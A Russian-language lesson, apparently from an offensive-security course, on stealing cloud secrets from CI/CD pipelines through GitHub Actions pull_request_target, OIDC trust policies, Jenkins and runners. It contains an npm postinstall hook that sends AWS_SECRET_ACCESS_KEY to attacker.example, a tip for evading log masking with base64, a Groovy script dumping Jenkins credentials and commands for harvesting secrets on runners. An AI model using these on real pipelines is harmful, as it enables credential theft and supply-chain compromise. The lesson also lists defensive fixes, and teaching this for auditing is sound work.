---
id: cloud-cicd-secrets
title: "CI/CD как сокровищница: секреты пайплайнов и злоупотребление раннерами"
category: cloud
parent: cloud-credential-hunting
difficulty: medium
order: 1
tags: [cloud, cicd, github-actions, gitlab-ci, jenkins, secrets, supply-chain]
prerequisites: [cloud-credential-hunting]
useful_for:
  - "Атака на CI/CD для получения облачных креденшелов"
  - "Понимание GITHUB_TOKEN, GitLab runners, Jenkins credentials"
  - "Переход к supply-chain атакам"
estimated_minutes: 50
summary: "CI/CD-пайплайны хранят секреты и имеют права на деплой. Разбираем GitHub Actions, GitLab CI, Jenkins: где лежат секреты, как их извлечь, как злоупотребить раннером и как это связано с облаком."
---

## Задача

В прошлых уроках мы искали ключи в коде и артефактах. Но есть место, куда ключи попадают «по работе» и где они всегда свежие — **CI/CD-пайплайн**, то есть автоматическая сборка и деплой. Пайплайн по определению доверенный: он собирает код, деплоит в продакшен и ходит в облако. Наша цель — заставить его выполнить **наш** код.

Конкретно: у цели публичный репозиторий на GitHub с автосборкой. Посмотрим, можно ли через обычный pull request добраться до облачных ключей.

## Данные: репозиторий и его workflow

**Workflow** — это файл в `.github/workflows/*.yml`, описывающий, что запускать. Посмотрим, как он устроен:

```
$ gh workflow list
Deploy to AWS   active
Run tests       active
```

Обрати внимание на триггер `Deploy to AWS`. Часто в нём встречается событие `pull_request_target`:

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # код из PR!
      - run: npm ci && npm test                          # исполняется с секретами
```

## Пробуем в лоб: почему это не «просто PR»

Обычное событие `pull_request` запускает workflow **без** секретов — это защита: код из чужого форка не должен видеть ключи. Но `pull_request_target` запускается в контексте **базового** репозитория, то есть **с секретами**, и при этом `checkout` выше берёт код из PR атакующего. Комбинация «секреты base + код PR» и есть дыра.

## Приём: исполняем свой код в пайплайне

Секреты в workflow доступны как `${{ secrets.* }}`. Нам не нужно их читать напрямую — достаточно, чтобы их увидел наш код. Форкаем репозиторий и добавляем в `package.json` хук, который выполняется автоматически при установке зависимостей:

```json
{ "scripts": { "postinstall": "curl -s https://attacker.example/?t=$AWS_SECRET_ACCESS_KEY" } }
```

Открываем PR. Workflow запускается на базовом репозитории, `npm ci` выполняет `postinstall`, и секрет уходит к нам на сервер.

## Полный прогон: от PR до облачных ключей

1. Форк → правка `package.json` → PR.
2. `pull_request_target` запускает деплой-джобу с секретами.
3. `npm ci` исполняет `postinstall` → эксфильтрация `AWS_SECRET_ACCESS_KEY`.
4. Проверяем добытый ключ: `aws sts get-caller-identity` → роль деплоя.
5. Если у `GITHUB_TOKEN` есть право `contents: write` — можно ещё и пушить коммит в базовый репозиторий.

Стоит помнить: GitHub **маскирует** значения секретов в логах, но только точные совпадения. Стоит завернуть секрет в `base64` или разбить на части — и маскирование не сработает.

## Приём 2: OIDC и доверие со звёздочкой

Современные пайплайны не хранят статические ключи, а получают облачные креды через **OIDC** — механизм, при котором CI предъявляет подписанный токен, а облако выдаёт временную роль. Выглядит так:

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
      aws-region: us-east-1
```

Уязвимость — в **trust policy** роли, то есть в правиле, кому она доверяет. Если условие допускает любой репозиторий, роль сможет принять кто угодно:

```
$ aws iam get-role --role-name ci-deploy --query 'Role.AssumeRolePolicyDocument'
"Condition": { "StringLike": { "token.actions.githubusercontent.com:sub": "repo:acme/*" } }
```

`repo:acme/*` — звёздочка. Правильное условие — строго конкретный репозиторий и ветка: `repo:acme/webapp:ref:refs/heads/main`.

## Другие CI: GitLab и Jenkins

- **GitLab CI** хранит секреты в CI/CD Variables проекта. Если переменная помечена *protected*, она доступна только на защищённых ветках — но пуш в `main` снимает это ограничение. Секреты светятся в логах, если скрипт делает `echo` или `set -x`.
- **Jenkins** — отдельная история. Если доступна **Script Console** (страница `/script`), это RCE: можно Groovy-скриптом прочитать хранилище кредов:
  ```groovy
  def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
    Jenkins.instance, null, null)
  creds.each { c -> println(c.id + ":" + c.username + ":" + c.password) }
  ```
- **Self-hosted runner** — это полноценный хост. Секреты остаются на его диске и в памяти; проверь `env`, `~/.aws`, `/var/run/docker.sock`.

## Приём 3: что взять с раннера

Если код исполнился, раннер — это обычный Linux-хост, и осматривать его надо так же, как любой захваченный сервер. Первым делом — переменные окружения: секреты пайплайна обычно пробрасываются именно туда.

```
$ env | grep -iE 'aws_|azure_|gcp_|token|secret|password'
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
GITHUB_TOKEN=ghs_...
```

Дальше — файлы, которые раннер оставляет после себя: конфиги облачных CLI и доступ к демону контейнеров.

```
$ cat ~/.aws/credentials 2>/dev/null
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 ... /var/run/docker.sock
```

Открытый `docker.sock` означает, что из джобы можно управлять демоном хоста — это уже побег из контейнера. А на **self-hosted** раннере секреты вообще остаются на диске между запусками: следующий, «легитимный» пайплайн может их прочитать. Вывод простой: раннер — это хост с ключами, а не изолированная песочница.

У GitLab логика та же: раннер регистрируется в проекте по **registration token**, и на self-hosted исполнителе переменные CI/CD Variables и кэш остаются на диске. Стоит заглянуть в `~/.gitlab-runner/config.toml` — там видно, к каким проектам раннер привязан и под каким пользователем выполняются джобы.

## Если не сработало

- **`pull_request` вместо `pull_request_target`.** Секретов нет — вектор не работает.
- **`permissions: read-all`.** `GITHUB_TOKEN` не даёт писать.
- **OIDC с точным `sub`.** Из своего форка роль не принять.
- **Required reviewers на environment.** Деплой ждёт одобрения человека.

## Что мы теперь знаем

1. CI — доверенный исполнитель с секретами и правами на деплой.
2. `pull_request_target` + checkout кода PR = исполнение чужого кода с секретами.
3. Маскирование секретов в логах обходится кодированием (`base64`).
4. OIDC заменяет статические ключи, но звёздочка в trust policy всё ломает.
5. Jenkins Script Console = RCE и доступ к credentials store.
6. Раннер — это хост: `env`, `~/.aws` и `docker.sock` дают продолжение атаки уже за пределами пайплайна.

## Квиз

Проверь себя.

```quiz
- question: "Почему событие pull_request_target опасно?"
  options:
    - "Оно запускает workflow с секретами base-репозитория и может исполнить код PR"
    - "Оно удаляет ветку"
    - "Оно блокирует merge"
    - "Оно отключает Actions"
  answer: 0
  explanation: "Секреты base + код PR = RCE с секретами."
- question: "Какой токен GitHub Actions выдаётся автоматически?"
  options:
    - "GITHUB_TOKEN"
    - "CI_JOB_TOKEN"
    - "AWS_SESSION_TOKEN"
    - "NPM_TOKEN"
  answer: 0
  explanation: "GITHUB_TOKEN создаётся для каждого запуска workflow."
- question: "Что такое OIDC-федерация в CI?"
  options:
    - "Получение облачных кредов по доверию без статических ключей"
    - "Шифрование логов"
    - "Кэширование зависимостей"
    - "Формат артефакта"
  answer: 0
  explanation: "CI предъявляет OIDC-токен, облако выдаёт роль."
- question: "Что читает Groovy-скрипт в Jenkins script console?"
  options:
    - "Credentials store и позволяет выполнять команды (RCE)"
    - "Только логи"
    - "Только конфиг nginx"
    - "Только DNS"
  answer: 0
  explanation: "Script console даёт RCE и доступ к credentials."
- question: "Какое условие trust policy OIDC-роли безопасно?"
  options:
    - "repo:acme/*"
    - "repo:acme/webapp:ref:refs/heads/main"
    - "любой repo:*"
    - "пустое условие"
  answer: 1
  explanation: "Доверять нужно конкретному репозиторию и ветке, без звёздочек."
```

## Куда дальше

В следующем уроке (`cloud-secrets-manager`) мы придём туда, где эти секреты хранятся централизованно, и разберём, как извлечь их все сразу, если права слишком широки. А пока главное: CI — это доверенный код с ключами, и обычный pull request иногда превращается в полный доступ к облаку.

## Где пригодится

- **Bug bounty:** уязвимые workflow публичных репозиториев.
- **Red team:** от CI к облачным кредам.
- **Пентест:** аудит пайплайнов и раннеров.
- **Работа/DevSecOps:** least-privilege токенов, OIDC trust policy, защита веток.
- **Дальше по дереву:** `cloud-cicd-github-actions`, `cloud-supply-chain`.
